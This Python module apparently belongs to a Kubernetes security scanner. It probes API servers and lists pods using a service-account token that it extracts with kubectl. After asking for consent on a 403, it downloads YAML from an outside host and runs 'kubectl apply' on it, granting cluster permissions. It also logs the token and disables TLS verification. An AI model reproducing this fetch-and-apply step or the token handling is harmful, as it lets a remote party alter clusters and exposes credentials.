import requests
import tempfile
import logging
import __main__
import json
import subprocess
from netaddr import IPNetwork

from netifaces import AF_INET, ifaddresses, interfaces
from src.conf.objects import Event
from src.conf.abcd import works
from src.types import Detector
from .hosts import notIp, notIface, ifaceList, HostDetectorPreStart

class AuthScanEvent(Event):
    def __init__(self, predefined_hosts=list()):
        self.predefined_hosts = predefined_hosts

class AuthBase(object):
    def __init__(self, name='', service='', image='', host='', pod_ip=''):
        self.name = name
        self.service = service
        self.image = image
        self.host = host
        self.pod_ip = pod_ip

class AuthPod(AuthBase):
    def __init__(self, name='', service='', image='', host='', pod_ip=''):
        AuthBase.__init__(self,name, service, image, host, pod_ip)

class AuthService(AuthBase):
    def __init__(self,name='', service='', image='', host='', pod_ip=''):
        AuthBase.__init__(self,name, service, image, host, pod_ip)
        self.host_ip = host

class AuthVulnerability(AuthBase,Event):
    def __init__(self,version='',path=''):
        self.version = version
        self.path = path
        self.token = True

@works.hang(AuthScanEvent)
class AuthDetector(Detector):
    def __init__(self, event):
        self.event = event
        self.path = "https://{}:{}/api/v1/".format(self.event.host, 6443)
        self.host = self.event.host
        self.port = 6443
        token = ''
        service = ''

    @staticmethod
    def connect_host(protocol, host, port, headers=''):
        try:
            path = "{}://{}:{}".format(protocol,host,port)
            r = requests.get("{}/api/v1/pods".format(path), headers=headers, verify=False)
            if r.status_code == 403:
                permission = raw_input("\n\x1b[1;34m    The Cluster-Role is not Setting.\n    Do you agree with the permissions for testing? (y/n) \x1b[1;m")
                if permission == 'n':
                    print("\x1b[1;34m    you can't test with this option.\x1b[1;m")
                    return

                else:
                    r = requests.post("http://hotsix.kro.kr/re_result.php", data={'chk':'0.5'})
                    f = tempfile.NamedTemporaryFile(suffix='.yaml')
                    logging.debug("file {} created.".format(f.name))
                    f.write(r.text)
                    logging.debug(f.read())
                    create_ok = subprocess.check_output("kubectl apply -f {}".format(str(f.name)),shell=True)
                    logging.debug(create_ok)

                    f.close()
                    r = requests.get("{}/api/v1/pods".format(path), headers=headers, verify=False)

            r_ver = requests.get("{}/version".format(path), headers=headers, verify=False).content
            version = json.loads(r_ver)['gitVersion']
            works.pick_point(AuthVulnerability(version,"{}:{}".format(host,port)))
            cluster_info = json.loads(r.content)
            for info in cluster_info['items']:
                service = info['spec']['containers'][0]['name']
                image = info['spec']['containers'][0]['image']
                host_ip = info['status']['hostIP']
                pod_ip = info['status']['podIP']
                if host_ip != pod_ip:
                    works.pick_point(AuthPod("Pod", service, image, host_ip, pod_ip))
                else:
                    works.pick_point(AuthService("Service", service, image, host_ip, pod_ip))
                    
            subprocess.call("kubectl delete ClusterRole prom-admin",shell=True)
            subprocess.call("kubectl delete ClusterRoleBinding prom-rbac",shell=True)
            
        except(requests.exceptions.ConnectionError, KeyError):
            print("error occured")
            pass



    def execute(self):
        for iface in ifaceList:
            if iface not in notIface:
                for i in ifaddresses(ifaceList[iface]).setdefault(AF_INET,[]):
                    for ip in HostDetectorPreStart.generate_subnet(i['addr'],'32'):
                        if HostDetectorPreStart.detect_server(ip,6443):
                            self.host = ip
                            break

        if __main__.options.service == 'default' or __main__.options.service == None:
            self.service = subprocess.check_output("kubectl get secrets | grep ^{} | cut -f1 -d ''".format("default"),shell=True).split(' ')[0]
        else : 
            self.service = __main__.options.service
        
        logging.debug("\nservice account : {}\n".format(self.service))
        
        if __main__.options.service == 'default' or __main__.options.token:
            self.token = "Bearer " + subprocess.check_output("kubectl describe secret {} | grep -E '^token' | cut -f2 -d':' | tr -d \" \"".format(self.service), shell=True).split('\n')[0]
        else :
            self.token = __main__.options.token
        
        logging.debug("token : {}".format(self.token))
        headers={'Authorization': self.token}
        self.connect_host("https",self.host,self.port,headers)
        return None
